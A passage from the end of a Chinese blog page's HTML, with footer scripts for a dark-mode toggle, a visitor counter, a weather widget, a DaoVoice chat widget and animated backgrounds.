</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

<!-- 深色模式自动调节 -->
<!-- 深色模式按钮 -->
<script>
    // 检查localStorage中是否有'dark'这个键，且其值是否为'1'
    if (localStorage.getItem('dark') === '1') {
        // 如果有且其值为'1'，则给body添加'dark'这个类，切换到深色模式
        document.body.classList.add('dark');
    }
    // 检查当前时间是否在晚上22点到早上7点之间
    // else if (new Date().getHours() >= 22 || new Date().getHours() < 7) {
    //     // 如果是，则给body添加'dark'这个类，切换到深色模式
    //     document.body.classList.add('dark');
    // } 
    // 检查用户的系统是否偏好深色模式
    else if (matchMedia('(prefers-color-scheme: dark)').matches) {
        // 如果是，则给body添加'dark'这个类，切换到深色模式
        document.body.classList.add('dark');
    }
</script>
<!-- 深色模式切换按钮，点击时调用switchNightMode()函数 -->
<a onclick="switchNightMode()" id="sma">
    <!-- 深色模式切换按钮的图标 -->
    <i class="fas fa-lightbulb" id="nightMode" aria-hidden="true"></i>
</a>


    <!-- 天气接口控件   -->
    
        <script type="text/javascript">
        WIDGET = {FID: 'zLkJSQpqsh'}
        </script>
    <!-- <script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"></script> -->

    <script type="text/javascript">
      var windowWidth = $(window).width();
      if (windowWidth > 768) {
          document.write('<script type="text/javascript" src="https://apip.weatherdt.com/float/static/js/r.js?v=1111"><\/script>');
      }
    </script>
    

    
    <script>
        (function (i, s, o, g, r, a, m) {
            i["DaoVoiceObject"] = r;
            i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date();
            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
            a.async = 1;
            a.src = g;
            a.charset = "utf-8";
            m.parentNode.insertBefore(a, m)
        })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
            "//widget.daovoice.io/widget/6984b559.js", "daovoice")
        daovoice('init', {
            app_id: "4xxxxxxxe"
        });
        daovoice('update');
    </script>
    

	
    
    <script type="text/javascript" color="0,0,255"
        pointColor="0,0,255" opacity='1'
        zIndex="-1" count="99"
        src="/libs/background/canvas-nest.js"></script>
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
